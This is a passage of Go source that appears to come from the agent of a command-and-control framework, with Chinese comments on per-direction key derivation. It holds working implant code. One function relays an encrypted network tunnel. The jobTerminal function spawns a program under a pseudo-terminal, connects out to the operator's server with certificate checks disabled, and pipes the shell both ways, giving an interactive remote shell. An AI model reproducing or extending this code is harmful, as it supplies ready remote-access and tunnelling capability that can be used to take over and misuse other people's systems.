		// ★ 两方向**必须**各用派生的密钥。enc 发往服务端 ⇒ a2s；dec 收自服务端 ⇒ s2a。
		// ★ 顺带把 aes.NewCipher 的 error 从 `_` 改成检查（密钥长度恒为 16，实际不会失败）。
		encCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTunA2S))
		if err != nil {
			_ = srvConn.Close()
			_ = clientConn.Close()
			return
		}
		encStream := cipher.NewCTR(encCipher, tunIv)
		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}

		decCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTunS2A))
		if err != nil {
			_ = srvConn.Close()
			return
		}
		decStream := cipher.NewCTR(decCipher, tunIv)
		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}

		ctx, cancel := context.WithCancel(context.Background())
		ctrl := &TunnelController{
			Cancel: cancel,
		}
		TUNNELS.Store(params.ChannelId, ctrl)
		defer TUNNELS.Delete(params.ChannelId)

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				_ = clientConn.Close()
				_ = srvConn.Close()
			})
		}

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			io.Copy(clientConn, streamReader)
			closeAll()
		}()

		go func() {
			defer wg.Done()
			buf := make([]byte, 32*1024)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					if ctrl.Paused.Load() {
						time.Sleep(50 * time.Millisecond)
						continue
					}

					clientConn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
					nr, er := clientConn.Read(buf)
					if nr > 0 {
						_, ew := streamWriter.Write(buf[0:nr])
						if ew != nil {
							closeAll()
							return
						}
					}
					if er != nil {
						if netErr, ok := er.(net.Error); ok && netErr.Timeout() {
							continue
						}
						closeAll()
						return
					}
				}
			}
		}()

		go func() {
			<-ctx.Done()
			closeAll()
		}()

		wg.Wait()

		cancel()
	}()
}

func jobTerminal(paramsData []byte) {
	var params utils.ParamsTerminalStart
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	go func() {
		active := true
		status := ""

		process := exec.Command(params.Program)
		ptyProc, err := functions.StartPtyCommand(process, uint16(params.Width), uint16(params.Height))
		if err != nil {
			active = false
			status = err.Error()
		}

		var srvConn net.Conn
		if profile.UseSSL {
			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if certerr != nil {
				return
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(profile.CaCert)

			config := &tls.Config{
				Certificates:       []tls.Certificate{cert},
				RootCAs:            caCertPool,
				InsecureSkipVerify: true,
			}
			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)

		} else {
			srvConn, err = net.Dial("tcp", profile.Addresses[0])
		}
		if err != nil {
			if active {
				functions.StopPty(ptyProc)
				_ = process.Process.Kill()
			}
			return
		}

		tunKey := make([]byte, 16)
		_, _ = rand.Read(tunKey)
		tunIv := make([]byte, 16)
		_, _ = rand.Read(tunIv)

		jobPack, _ := msgpack.Marshal(utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: active, Status: status})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_TERMINAL, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(srvConn, profile.BannerSize)
			if err != nil {
				srvConn.Close()
				if active {
					functions.StopPty(ptyProc)
					_ = process.Process.Kill()
				}
				return
			}
		}

		/// Send Init
		_ = functions.SendMsg(srvConn, jobMsg)

		if !active {
			srvConn.Close()
			return
		}

		// ★ 终端同理：enc = agent→server（a2s），dec = server→agent（s2a）。
		encCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTermA2S))
		if err != nil {
			_ = srvConn.Close()
			return
		}
		encStream := cipher.NewCTR(encCipher, tunIv)
		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}

		decCipher, err := aes.NewCipher(axDirKey(tunKey, tunIv, axKeyLabelTermS2A))
		if err != nil {
			_ = srvConn.Close()
			return
		}
		decStream := cipher.NewCTR(decCipher, tunIv)
		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}

		ctx, cancel := context.WithCancel(context.Background())
		TERMINALS.Store(params.TermId, cancel)
		defer TERMINALS.Delete(params.TermId)

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				time.Sleep(200 * time.Millisecond)
				_ = functions.StopPty(ptyProc)
				if functions.IsProcessRunning(process) {
					_ = process.Process.Kill()
				}
				_ = srvConn.Close()
			})
		}

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			functions.RelayConnToPty(ptyProc, streamReader)
			closeAll()
		}()

		go func() {
			defer wg.Done()
			functions.RelayPtyToConn(streamWriter, ptyProc)
			closeAll()
		}()

		go func() {
			<-ctx.Done()
			closeAll()
		}()

		wg.Wait()
		_ = process.Wait()
		cancel()
	}()
}
